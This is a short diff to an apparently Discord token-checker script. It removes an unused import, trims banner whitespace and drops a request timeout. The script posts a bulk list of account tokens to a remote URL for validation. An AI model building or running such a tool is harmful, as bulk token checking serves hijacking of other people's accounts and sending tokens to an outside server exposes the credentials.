@@ -1,7 +1,6 @@
 import json
 import os
 import re
-import time
 from pathlib import Path
 from sys import exit
 
@@ -35,7 +34,7 @@ class Checker:
   / _ \(_)__ _______  _______/ / /_  __/__  / /_____ ___    / ___/ /  ___ ____/ /_____ ____  _  __|_  |
  / // / (_-</ __/ _ \/ __/ _  /   / / / _ \/  '_/ -_) _ \  / /__/ _ \/ -_) __/  '_/ -_) __/ | |/ / __/ 
 /____/_/___/\__/\___/_/  \_,_/   /_/  \___/_/\_\\__/_//_/  \___/_//_/\__/\__/_/\_\\__/_/    |___/____/ 
-                                                                                           {Fore.CYAN}by GuFFy_OwO{Fore.RESET}                                                                                                    
+                                                                                           {Fore.CYAN}by GuFFy_OwO{Fore.RESET} 
 """)
 
         print(f"{Fore.RESET}[{Fore.CYAN}1{Fore.RESET}] Enter token")
@@ -78,7 +77,7 @@ class Checker:
         print(f"Send tokens... Verification of 1000 tokens can take about 8 minutes.")
 
         try:
-            res = requests.post(self.url, timeout=60000, json={"action": "checker", "data": self.tokens_parsed})
+            res = requests.post(self.url, json={"action": "checker", "data": self.tokens_parsed})
 
             if res.status_code != 200:
                 fast_exit("Status code is not 200. Something wrong with tokens...")
